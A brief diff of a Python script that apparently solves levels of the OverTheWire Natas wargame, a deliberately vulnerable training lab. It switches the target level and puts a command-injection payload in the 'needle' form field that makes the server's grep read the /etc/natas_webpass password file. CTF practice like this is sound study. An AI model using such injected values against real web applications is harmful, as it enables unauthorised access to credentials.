@@ -8,10 +8,10 @@ from pathlib import Path
 from bs4 import BeautifulSoup
 
 
-password_file = Path('passwords.txt')
+password_file = Path('../passwords.txt')
 
 
-level = 10
+level = 9
 username = '%s%s' % ('natas', level)
 passwords = open(password_file, 'r').readlines()
 
@@ -26,7 +26,7 @@ if __name__ == '__main__':
 
         # On passthru function,  search for the password as grep -i indicates.
         data = {
-            'needle': '"^[A-Za-z0-9].*$" /etc/natas_webpass/natas11 \\',
+            'needle': '"^[A-Za-z0-9].*$" /etc/natas_webpass/natas10 | xargs echo',
             'submit': 'submit'
         }
 
